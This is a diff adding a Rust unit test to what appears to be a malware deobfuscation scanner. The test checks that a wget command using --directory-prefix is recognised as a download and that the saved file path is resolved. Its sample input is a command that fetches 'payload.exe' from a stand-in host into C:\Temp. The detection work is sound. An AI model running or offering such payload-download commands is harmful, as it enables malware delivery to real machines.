@@ -10995,6 +10995,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
     }
 
     #[test]
+    fn wget_directory_prefix_resolves_to_downloaded_filename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --directory-prefix=C:\Temp https://wget-dir-prefix.example/payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-dir-prefix.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+            )
+        });
+        assert!(
+            has,
+            "wget --directory-prefix destination was not resolved to the file path: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn renamed_certutil_urlcache_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
